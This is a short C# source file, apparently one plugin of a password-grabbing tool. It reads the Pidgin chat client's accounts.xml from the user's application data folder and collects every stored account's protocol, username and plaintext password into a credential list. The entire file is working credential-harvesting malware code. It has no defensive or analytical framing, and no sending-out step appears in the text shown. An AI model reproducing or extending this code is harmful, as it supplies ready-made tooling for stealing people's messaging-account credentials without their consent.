using System;
using System.Collections.Generic;
using System.Text;
using System.Xml;

namespace Plugin_PwdGrabber
{
    class Pidgin
    {
        public static void Start()
        {
            string PidginPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\.purple\accounts.xml";

            XmlTextReader reader = new XmlTextReader(PidginPath);
            XmlDocument objXmlDocument = new XmlDocument();
            objXmlDocument.Load(reader);

            foreach (XmlNode objXmlNode in objXmlDocument.DocumentElement.ChildNodes)
            {
                XmlNodeList InnerList = objXmlNode.ChildNodes;

                string Protocol = InnerList[0].InnerText.Replace("prpl-", "");
                string Username = InnerList[1].InnerText;
                string Password = InnerList[2].InnerText;

                UserDataManager.GatheredCredentials.Add(new Credential("Pidgin", Protocol, Username, Password, ""));
            }
        }
    }
}
